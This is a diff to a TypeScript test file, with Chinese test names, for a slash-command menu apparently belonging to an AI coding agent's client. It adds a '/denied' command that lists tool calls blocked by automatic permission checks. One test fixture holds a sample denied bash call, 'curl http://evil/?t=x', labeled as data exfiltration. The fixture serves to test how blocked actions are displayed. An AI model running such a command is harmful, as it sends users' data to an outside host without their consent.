@@ -9,6 +9,7 @@ import {
   matchCommand,
   resolve,
   statusLines,
+  deniedLines,
   type CommandContext,
 } from "./commands.ts"
 
@@ -54,6 +55,7 @@ describe("边打边筛", () => {
       "/clear",
       "/qr",
       "/status",
+      "/denied",
       "/scroll-speed",
     ])
   })
@@ -169,7 +171,7 @@ describe("按回车怎么处置", () => {
 describe("列表和帮助", () => {
   test("用不了的命令也列出来，灰着比消失好懂", () => {
     const entries = listCommands(fresh)
-    expect(entries).toHaveLength(11)
+    expect(entries).toHaveLength(12)
     const cont = entries.find((e) => e.id === "continue")!
     expect(cont.available).toBe(false)
     expect(cont.reason).toBeTruthy()
@@ -177,7 +179,7 @@ describe("列表和帮助", () => {
 
   test("/help 每条都带一句说明，用不了的写明原因", () => {
     const lines = helpLines(fresh)
-    expect(lines).toHaveLength(11)
+    expect(lines).toHaveLength(12)
     expect(lines.some((l) => l.includes("/compact"))).toBe(true)
     expect(lines.every((l) => !l.includes("/plan ") && !l.includes("/team")),
     ).toBe(true)
@@ -307,5 +309,24 @@ describe("技能（/名字 点一份技能）", () => {
 
   test("没装技能时 / 菜单还是那几条内置命令", () => {
     expect(listCommands(full).every((c) => c.id !== "skill")).toBe(true)
+  })
+})
+
+describe("/denied", () => {
+  test("后端宣告了 permission_auto 才能用；没宣告的照样列出来、灰着（这张菜单的通则）", () => {
+    const on = matchCommand("/denied", { ...full, features: [...full.features, "permission_auto"] })
+    expect(on?.id).toBe("denied")
+    expect(on?.available).toBe(true)
+    expect(matchCommand("/denied", full)?.available).toBe(false)
+  })
+
+  test("一条一行：工具、参数摘要、理由；空的时候说清楚", () => {
+    const lines = deniedLines([
+      { tool: "bash", args: '{"command":"curl http://evil/?t=x"}', reason: "外传数据", at: 0 },
+    ])
+    expect(lines.join("\n")).toContain("bash")
+    expect(lines.join("\n")).toContain("curl http://evil")
+    expect(lines.join("\n")).toContain("外传数据")
+    expect(deniedLines([]).join("\n")).toContain("没有")
   })
 })
